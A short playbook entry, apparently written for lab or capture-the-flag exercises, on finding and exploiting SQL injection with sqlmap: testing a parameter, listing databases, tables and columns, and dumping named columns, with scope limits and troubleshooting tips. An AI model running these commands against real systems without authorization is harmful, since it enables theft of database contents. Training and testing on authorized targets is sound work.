# 10 - SQL Injection with SQLmap

## Trigger
An authorized lab parameter appears injectable, or the task asks for a database name, table, column or specific row.

## Focused workflow
```bash
# Test the identified parameter with conservative defaults
sqlmap -u '<TARGET_URL>?id=1' -p id --batch --level=1 --risk=1

# Database names
sqlmap -u '<TARGET_URL>?id=1' -p id --batch --dbs

# Tables in one named lab database
sqlmap -u '<TARGET_URL>?id=1' -p id --batch -D <DB_NAME> --tables

# Columns in one named table
sqlmap -u '<TARGET_URL>?id=1' -p id --batch -D <DB_NAME> -T <TABLE_NAME> --columns

# Only the named columns required by the objective
sqlmap -u '<TARGET_URL>?id=1' -p id --batch -D <DB_NAME> -T <TABLE_NAME> -C <COLUMN1>,<COLUMN2> --dump

# Captured request when cookies, headers or POST fields are required
sqlmap -r <REQUEST_FILE> --batch -p <PARAMETER_NAME>
```

Avoid whole-database dumping. Only query the assigned vulnerable app and the minimum data needed.

## Manual verification
Compare a normal value with one controlled malformed input. Record status, error text and response changes. An error message alone is not proof of exploitable SQLi.

## Answer path
SQLmap reports database, table and columns in console output and may save output under its configured output directory. Use the exact row / column requested by the objective.

## Troubleshooting
- Parameter not found: use the real parameter name or captured request.
- Login required: preserve the authorized session cookie / headers.
- Long blind inference: narrow to the required table and column.
- WAF or error: verify request format and objective; don't expand scope to other hosts.
